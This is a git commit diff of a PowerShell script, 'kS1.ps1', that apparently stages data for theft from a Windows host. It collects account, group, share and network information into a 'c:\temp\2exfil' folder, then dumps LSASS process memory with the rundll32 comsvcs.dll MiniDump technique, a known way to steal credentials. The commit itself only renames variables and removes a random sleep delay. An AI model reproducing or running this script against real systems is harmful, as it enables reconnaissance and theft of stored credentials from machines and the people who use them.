dfeaea927054b5475d0549b3b440d3d6cf52d7e0
encryptedSubject <148569257+encryptedSubject@users.noreply.github.com>
2023-12-18 12:51:51 -0500

    Update kS1.ps1
    k update

--- stage/kS1.ps1
+++ stage/kS1.ps1
@@ -1,16 +1,14 @@
 mkdir c:\temp\2exfil
-$Path = c:\temp\2exfil\AccountInfo.txt
-$Path2 = c:\temp\2exfil\NetworkInfo.txt
-net user >> $Path
-net localgroup >> $Path
-net group >> $Path
-net use >> $Path
-net share >> $Path  
-net view >> $Path
-net accounts >> $Path
-Netstat -a >> $Path2
-
-Start-Sleep (Get-Random -min 60 -max 120)
+$dog = c:\temp\2exfil\AccountInfo.txt
+$dog2 = c:\temp\2exfil\NetworkInfo.txt
+net user >> $dog
+net localgroup >> $dog
+net group >> $dog
+net use >> $dog
+net share >> $dog  
+net view >> $dog
+net accounts >> $dog
+Netstat -a >> $dog2
 
 $P = get-process lsass |select -expand id
 C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump $P c:\temp\2exfil\dump.txt full
